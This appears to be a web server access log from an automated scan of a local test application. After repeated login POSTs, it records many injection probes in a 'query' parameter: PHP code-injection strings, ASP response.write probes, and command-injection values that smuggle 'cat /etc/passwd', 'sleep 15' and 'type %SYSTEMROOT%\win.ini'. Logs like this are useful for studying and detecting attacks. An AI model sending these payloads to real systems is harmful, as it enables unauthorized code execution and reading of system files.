172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 300 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /login.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /robots.txt?query=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /robots.txt?query=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /setup.php?query=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22 HTTP/1.1" 200 6028 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /robots.txt?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /robots.txt?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /robots.txt?query=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /setup.php?query=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27 HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /setup.php?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /robots.txt?query=%22%2Bresponse.write%28%5B100%2C000*100%2C000%29%2B%22 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /setup.php?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /robots.txt?query=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /setup.php?query=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /robots.txt?query=response.write%28100%2C000*100%2C000%29 HTTP/1.1" 200 254 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /setup.php?query=%22%2Bresponse.write%28%5B100%2C000*100%2C000%29%2B%22 HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /setup.php?query=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /setup.php?query=response.write%28100%2C000*100%2C000%29 HTTP/1.1" 200 4347 "http://127.0.0.1:8080/login.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /setup.php?query=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /sitemap.xml?query=%22%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%22 HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /sitemap.xml?query=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27 HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /setup.php?query=%27%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B%24var%3D%27 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /setup.php?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /sitemap.xml?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /setup.php?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /sitemap.xml?query=%24%7B%40print%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%7D%5C HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /sitemap.xml?query=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /setup.php?query=%3Bprint%28chr%28122%29.chr%2897%29.chr%28112%29.chr%2895%29.chr%28116%29.chr%28111%29.chr%28107%29.chr%28101%29.chr%28110%29%29%3B HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /setup.php?query=%22%2Bresponse.write%28%5B100%2C000*100%2C000%29%2B%22 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /sitemap.xml?query=%22%2Bresponse.write%28%5B100%2C000*100%2C000%29%2B%22 HTTP/1.1" 404 466 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /sitemap.xml?query=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /setup.php?query=%2Bresponse.write%28%7B0%7D*%7B1%7D%29%2B HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /setup.php?query=response.write%28100%2C000*100%2C000%29 HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /sitemap.xml?query=response.write%28100%2C000*100%2C000%29 HTTP/1.1" 404 447 "-" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "POST /setup.php HTTP/1.1" 302 281 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /docs HTTP/1.1" 301 520 "http://127.0.0.1:8080/about.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%26cat+%2Fetc%2Fpasswd%26 HTTP/1.1" 200 6343 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%26cat+%2Fetc%2Fpasswd%26 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%3Bcat+%2Fetc%2Fpasswd%3B HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%3Bcat+%2Fetc%2Fpasswd%3B HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%22%26cat+%2Fetc%2Fpasswd%26%22 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%22%26cat+%2Fetc%2Fpasswd%26%22 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%22%3Bcat+%2Fetc%2Fpasswd%3B%22 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%22%3Bcat+%2Fetc%2Fpasswd%3B%22 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%27%26cat+%2Fetc%2Fpasswd%26%27 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%27%26cat+%2Fetc%2Fpasswd%26%27 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%27%3Bcat+%2Fetc%2Fpasswd%3B%27 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%27%3Bcat+%2Fetc%2Fpasswd%3B%27 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%26sleep+15%26 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%26sleep+15%26 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%3Bsleep+15%3B HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%3Bsleep+15%3B HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%22%26sleep+15%26%22 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%22%26sleep+15%26%22 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%22%3Bsleep+15%3B%22 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%26sleep+%7B0%7D%26 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%3Bsleep+%7B0%7D%3B HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%26type+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%22%3Bsleep+15%3B%22 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%26sleep+%7B0%7D%26 HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%22%26type+%25SYSTEMROOT%25%5Cwin.ini%26%22 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%3Bsleep+%7B0%7D%3B HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%22%7Ctype+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /about.php?query=query%26type+%25SYSTEMROOT%25%5Cwin.ini HTTP/1.1" 200 5112 "http://127.0.0.1:8080/setup.php" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
172.17.0.1 - - [12/Feb/2019:08:55:36 +0000] "GET /?query=query%27%26type+%25SYSTEMROOT%25%5Cwin.ini%26%27 HTTP/1.1" 302 281 "http://127.0.0.1:8080/robots.txt" "Mozilla/5.0 (Windows NT 6.3; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0"
